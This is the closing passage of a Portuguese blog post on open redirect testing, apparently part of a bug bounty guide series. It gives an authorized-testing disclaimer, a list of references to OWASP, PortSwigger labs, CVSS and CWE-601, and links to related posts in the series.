Tudo aqui é pra **testes autorizados** — programas de bug bounty (dentro do escopo), pentests contratados e labs legais. Testar redirects e, principalmente, chains de roubo de token em sistemas de terceiros sem autorização é crime — e desnecessário, dado que os labs da PortSwigger reproduzem exatamente esses cenários. Ao demonstrar a chain de OAuth, **nunca** use a conta de uma pessoa real sem consentimento; use duas contas de teste suas. Use pra proteger, reportar com responsabilidade e ensinar.

## Referências

- [OWASP — Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [PortSwigger — Open redirection (reflected)](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [PortSwigger — OAuth 2.0 authentication vulnerabilities](https://portswigger.net/web-security/oauth) (roubo de `code`/token via open redirect no cliente)
- [PortSwigger — Lab: Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect) (a chain `redirect_uri` + `/../` + open redirect na prática)
- [PortSwigger — DOM-based open redirection](https://portswigger.net/web-security/dom-based/open-redirection)
- [FIRST — CVSS v4.0 Specification](https://www.first.org/cvss/v4.0/specification-document) (métricas de impacto no sistema vs. subsequente — por que v4.0 descreve melhor um trampolim)
- [MITRE — CWE-601: URL Redirection to Untrusted Site ('Open Redirect')](https://cwe.mitre.org/data/definitions/601.html)
- [RFC 3986 — URI Generic Syntax (§3.2.1 userinfo, §4.2 relative reference)](https://datatracker.ietf.org/doc/html/rfc3986)
- [PayloadsAllTheThings — Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md) (wordlist de bypass pronta)

---
*Este post é o **trampolim** da série — ele alimenta três outros: [Account Takeover](/posts/account-takeover/) (onde a chain de `redirect_uri` → roubo de `code`/token vira ATO), [SSRF](/posts/ssrf/) (onde o redirect fura a allowlist de saída) e [Chaining de Vulnerabilidades](/posts/chaining-vulnerabilidades/) (onde ele entra como gadget de chains maiores). Vizinho de classe: [CRLF Injection](/posts/crlf-request-smuggling/). Base: [Recon & Discovery](/posts/recon-discovery/) · calibre o impacto em [Severidade & Impacto](/posts/severidade-impacto-triagem/).*

---

*📚 Parte do **[Guia Completo de Bug Bounty](/posts/guia-bug-bounty/)** — o índice da série, do básico ao avançado.*
